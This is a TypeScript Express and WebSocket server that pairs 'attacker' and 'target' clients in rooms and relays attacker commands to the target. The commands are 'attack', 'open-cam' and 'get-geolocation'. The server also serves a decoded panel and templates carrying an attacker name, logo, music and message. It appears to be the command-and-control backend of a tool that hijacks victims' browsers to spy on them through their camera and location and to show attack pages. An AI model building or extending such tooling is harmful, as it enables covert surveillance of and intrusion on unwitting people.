import fs from "fs";
import path from "path";
import http from "http";
import { v4 as uuidv4 } from "uuid";

import { WebSocket, WebSocketServer } from "ws";
import express from "express";
import cors from "cors";
import helmet from "helmet";
import morgan from "morgan";
import dotenv from "dotenv";

// compiled
import { getDecodedFile as getDecodedFilePanel } from "./panel_compiled";
import { templates } from "./template_compiled";

// const roomPath = path.join(__dirname, "room");
// if (!fs.existsSync(roomPath)) {
//   fs.mkdirSync(roomPath);
// }

dotenv.config();

const PORT = process.env.PORT || 3000;

const app = express();
const server = http.createServer(app);
const websocket = new WebSocketServer({ server });

app.use(cors());
app.use(helmet());
app.use(morgan("dev"));
app.use(
  express.json({
    limit: "2mb",
  })
);

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Ketika ada koneksi WebSocket baru
const attackers = new Map<string, WebSocket>(); // room_id
const targets = new Map<string, WebSocket>(); // random uuid
interface RoomField {
  attacker_name: string;
  template_key: string;
  logo?: string;
  music?: string;
  message: string;
  teams: string[];
}
interface Room {
  attacker_id?: string;
  target_id?: string;
  is_target_close?: boolean;
  fields?: RoomField;
}
const rooms = new Map<string, Room>(); // room_id
websocket.on("connection", (ws: WebSocket) => {
  const id = uuidv4();
  const path = ws.url;
  console.log(`Client ${id} connected to ${path}`);

  // Handle join_attacker and join_target through message events
  const handleJoinAttacker = () => {
    attackers.set(id, ws);
    rooms.set(path, {
      attacker_id: id,
    });
    console.log(`Attacker ${id} joined room ${path}`);
  };

  const handleJoinTarget = () => {
    targets.set(id, ws);
    const room = rooms.get(path);
    if (room) {
      room.target_id = id;
    }
    console.log(`Target ${id} joined room ${path}`);
  };
  ws.on("close", () => {
    console.log("Client disconnected");
    const is_attacker = attackers.get(id);
    if (is_attacker) {
      attackers.delete(id);
      rooms.delete(path);
    }
    const is_target = targets.get(id);
    if (is_target) {
      targets.delete(id);
      const room = rooms.get(path);
      if (room) {
        room.is_target_close = true;
      }
    }
  });

  type DataEvent = "join" | "action" | "message";
  type DataJoinAt = "attacker" | "target";
  interface Action {
    type: "attack" | "open-cam" | "get-geolocation";
  }
  type MessageType = "target" | "attacker";
  interface Message {
    type: MessageType;
    device_id: string;
    content: string;
  }
  interface Data {
    event: DataEvent;
    join_at?: DataJoinAt;
    action?: Action; // only attacker side
    message?: Message;
  }
  ws.on("message", (res) => {
    const str = res.toString();
    console.log("Received:", str);
    const data = JSON.parse(str) as Data;

    // Handle simple string commands
    if (data.event === "join") {
      if (data.join_at === "attacker") {
        handleJoinAttacker();
      } else if (data.join_at === "target") {
        handleJoinTarget();
      }
      return;
    }

    // Handle JSON messages
    if (data.event === "message" && data.message) {
      const msg = data.message;
      console.log("Processed message:", msg);

      // Forward message to appropriate recipients
      // You can add logic here to forward messages between attacker and target
    }

    // Handle action events
    if (data.event === "action" && data.action) {
      const action = data.action;
      console.log("Processed action:", action);

      // Forward action to target if connected
      const room = rooms.get(path);
      if (room && room.target_id) {
        const targetWs = targets.get(room.target_id);
        if (targetWs && targetWs.readyState === WebSocket.OPEN) {
          targetWs.send(JSON.stringify(data));
          console.log(`Action forwarded to target ${room.target_id}`);
        }
      }
    }
  });

  // Optional: kirim pesan saat connect
  ws.send(
    JSON.stringify({
      device_id: id,
    })
  );
});

app.post("/api/config/set/:room_id", (req, res) => {
  const room_id = req.params.room_id;
  const body = req.body as RoomField;
  const room = rooms.get(room_id);
  if (room) {
    room.fields = body;
  }
  res.json({
    message: "success",
  });
});

app.get("/api/templates", (req, res) => {
  res.json({
    message: "success",
    data: Object.keys(templates),
  });
});

// Serve the main panel page
app.use((req, res, next) => {
  let endpoint = req.path;
  if (endpoint.startsWith("/socket.io")) {
    next();
    return;
  }
  if (endpoint === "/") {
    endpoint = "/index.html";
  }
  const file = getDecodedFilePanel(endpoint);
  if (!file) {
    return res.status(404).send("File not found");
  }
  res.set("Content-Type", file.type);
  res.send(file.content);
});
